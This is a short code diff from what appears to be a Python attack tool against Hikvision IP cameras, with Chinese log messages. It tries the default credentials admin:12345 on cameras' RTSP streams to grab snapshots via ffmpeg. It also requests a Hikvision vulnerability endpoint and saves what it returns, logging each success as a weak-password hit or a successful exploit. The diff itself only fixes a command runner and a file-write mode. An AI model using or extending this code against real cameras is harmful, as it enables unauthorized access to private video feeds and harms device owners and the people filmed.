@@ -13,11 +13,12 @@ disable_warnings()
 
 def get_rtsp(ip: str, save_path: Path) -> bool:
     """根据rtsp地址获取摄像头快照"""
-    cmd = f'ffmpeg -rw_timeout 10 -i "rtsp://admin:12345@{ip}:554/h264/ch1/main/av_stream" -y -f mjpeg -t 0.001 -s 1280x720 {save_path.joinpath(ip+".jpg")}'
-    # res = run_cmd(cmd)
-    res = os.system(cmd)
+    cmd = f'ffmpeg -i "rtsp://admin:12345@{ip}:554/h264/ch1/main/av_stream" -y -f mjpeg -t 0.001 -s 1280x720 {save_path.joinpath(ip+".jpg")}'
+    res = run_cmd(cmd)
+    # res = os.system(cmd)
     # if res and ("401" not in res[1]) and ("404" not in res[1]):
-    if res == 0:
+    # if res == 0:
+    if res:
         logger.success(f"[+] IP:{ip},海康威视rstp弱密码成功!")
         return True
     logger.info(f"[-] IP:{ip},海康威视rstp弱密码失败...")
@@ -35,7 +36,7 @@ def get_cve(ip: str, save_path: Path) -> bool:
             if res.status_code != 200:
                 logger.info(f"[-] {ip} hikvison漏洞失败,请求码:{res.status_code}")
                 return False
-            with save_path.open(mode="wa") as fp:
+            with save_path.open(mode="wb") as fp:
                 fp.write(res.content)
                 logger.success(f"[+] {ip} hikvison漏洞利用成功!")
                 return True
